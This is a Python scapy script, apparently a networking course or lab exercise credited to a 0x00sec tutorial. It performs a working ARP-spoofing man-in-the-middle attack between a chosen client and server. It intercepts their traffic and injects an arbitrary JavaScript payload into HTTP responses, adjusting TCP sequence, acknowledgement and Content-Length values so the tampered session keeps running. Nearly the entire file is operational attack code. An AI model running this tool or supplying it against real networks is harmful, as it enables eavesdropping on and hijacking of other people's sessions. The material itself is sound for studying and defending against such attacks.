# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
	parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
	parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
	parser.add_argument("-s", "--script", help="script to inject", required=True)
	parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
	return parser.parse_args()


def debug(s):
	global verbosity
	if verbosity >= 1:
		print('#{0}'.format(s))
		sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
	global attackerIP
	result = sr1(ARP(op="who-has", psrc=attackerIP, pdst=IP), verbose=False)
	return result[ARP].hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
	while True:
		spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
		spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
		time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
	debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
	send(ARP(op="is-at", psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac))


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
	debug(f"restoring ARP table for {dstIP}")
	send(ARP(op="is-at", psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC))


# TODO: handle intercepted packets
def interceptor(packet):
	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, portLength, resetPort, multiRes
	if packet[Ether].src == attackerMAC:
		return
	
	payload = '<script>' + script + '</script>'
	if packet.haslayer(IP) and packet[Ether].dst == attackerMAC:
		if packet[IP].src == clientIP and packet[IP].dst == serverIP:
			# Request from client to server
			oriAck = 0
			if packet.haslayer(TCP):
				if packet[TCP].sport in portLength:
					# Change ackowledgement number to what server wants to see.
					# Record ackowledgement number from the request.
					portLength[packet[TCP].sport][0] = packet[TCP].ack
					oriAck = packet[TCP].ack
					for index, element in enumerate(portLength[packet[TCP].sport]):
						if index > 0:
							packet[TCP].ack = packet[TCP].ack - element
				if packet[TCP].flags != "FA":
					print("# Request")
				elif packet[TCP].flags == "FA":
					print("# Finish")
				if packet[TCP].sport in resetPort:
					if packet[TCP].sport in portLength:
						portLength.pop(packet[TCP].sport)
					resetPort.pop(packet[TCP].sport)
				print(f"\tflags: {packet[TCP].flags}")
				print(f"\tsrc: {packet[TCP].sport}")
				print(f"\tseq: {packet[TCP].seq}")
				print(f"\told ack: {oriAck}")
				print(f"\tnew ack: {packet[TCP].ack}")
				if packet[TCP].sport in portLength:
					print(f"\t{packet[TCP].sport}:{portLength[packet[TCP].sport]}")
				del packet[IP].len
				del packet[IP].chksum
				del packet[TCP].chksum
			packet[Ether].src = attackerMAC
			packet[Ether].dst = serverMAC
			frags = fragment(packet, fragsize = 500)
			for frag in frags:
				sendp(frag)
		elif packet[IP].src == serverIP and packet[IP].dst == clientIP:
			# Response from server to client
			oriSeq = 0
			if packet.haslayer(Raw):
				# Add payload.
				httpLoad = packet[Raw].load.decode('utf-8')
				httpLoad = httpLoad.replace('</body>', payload + '</body>')
				
				# Change sequence number to what client wants to see.
				if packet[TCP].dport in portLength:
					oriSeq = packet[TCP].seq
					if packet[TCP].dport in multiRes:
						# If it is not first segment, rebase it.
						# Only rebase it if it is not in first response.
						diff = packet[TCP].seq - multiRes[packet[TCP].dport]
						if portLength[packet[TCP].dport][0] != 0:
							packet[TCP].seq = portLength[packet[TCP].dport][0] + diff
					else:
						# Sequence number of first segment is acknowledgement number from request.
						packet[TCP].seq = portLength[packet[TCP].dport][0]
				
				# Store sequence number of first segment.
				if packet[TCP].dport not in multiRes:
					if oriSeq == 0:
						multiRes[packet[TCP].dport] = packet[TCP].seq
					else:
						multiRes[packet[TCP].dport] = oriSeq
				
				# Clear record if it is last segment.
				if packet[TCP].flags == "PA" and packet[TCP].dport in multiRes:
					multiRes.pop(packet[TCP].dport)
				
				# Change content length in http header.
				try:
					loadSubString = httpLoad.split()
					index = loadSubString.index('Content-Length:')
					length = int(loadSubString[index+1])
					newLength = length + len(payload)
					lenDiff = len(payload) + len(str(newLength)) - len(str(length))
					if packet[TCP].dport in portLength:
						# Record original content length of http load, length difference and
						# increment number of responses.
						if packet[TCP].flags != "FA":
							portLength[packet[TCP].dport].append(lenDiff)
					else:
						# Record original content length of http load, length difference and
						# first response.
						portLength[packet[TCP].dport] = [0, lenDiff]
					httpLoad = httpLoad.replace('Content-Length: ' + str(length), 'Content-Length: ' + str(newLength))
				except:
					pass
				packet[Raw].load = httpLoad.encode('utf-8')
				del packet[IP].len
				del packet[IP].chksum
				del packet[TCP].chksum
			elif packet.haslayer(TCP):
				if packet[TCP].dport in portLength:
					# Change sequence number to what client wants to see.
					oriSeq = packet[TCP].seq
					packet[TCP].seq = portLength[packet[TCP].dport][0]
				del packet[IP].len
				del packet[IP].chksum
				del packet[TCP].chksum
			if packet.haslayer(TCP):
				if packet[TCP].flags == "FA":
					resetPort[packet[TCP].dport] = True
				print("# Response")
				print(f"\tflags: {packet[TCP].flags}")
				print(f"\tdst: {packet[TCP].dport}")
				print(f"\told seq: {oriSeq}")
				print(f"\tnew seq: {packet[TCP].seq}")
				print(f"\tack: {packet[TCP].ack}")
			if packet[TCP].dport in portLength:
				print(f"\t{packet[TCP].dport}:{portLength[packet[TCP].dport]}")
			packet[Ether].src = attackerMAC
			packet[Ether].dst = clientMAC
			frags = fragment(packet, fragsize = 500)
			for frag in frags:
				sendp(frag)


if __name__ == "__main__":
	args = parse_arguments()
	verbosity = args.verbosity
	if verbosity < 2:
		conf.verb = 0 # minimize scapy verbosity
	conf.iface = args.interface # set default interface

	clientIP = args.clientIP
	serverIP = args.serverIP
	attackerIP = get_if_addr(args.interface)
	script = args.script
	if script is None:
		script = 'alert("Successful Injection!")'

	clientMAC = mac(clientIP)
	serverMAC = mac(serverIP)
	attackerMAC = get_if_hwaddr(args.interface)
	
	# dictionary of [ack from request, 1st lenDiff, 2nd lenDiff, ...]
	portLength = {}
	
	resetPort = {}
	
	multiRes = {}

	# start a new thread to ARP spoof in a loop
	spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
	spoof_th.start()

	# start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
	sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
	sniff_th.start()

	try:
		while True:
			pass
	except KeyboardInterrupt:
		restore(clientIP, clientMAC, serverIP, serverMAC)
		restore(serverIP, serverMAC, clientIP, clientMAC)
		sys.exit(1)

	restore(clientIP, clientMAC, serverIP, serverMAC)
	restore(serverIP, serverMAC, clientIP, clientMAC)
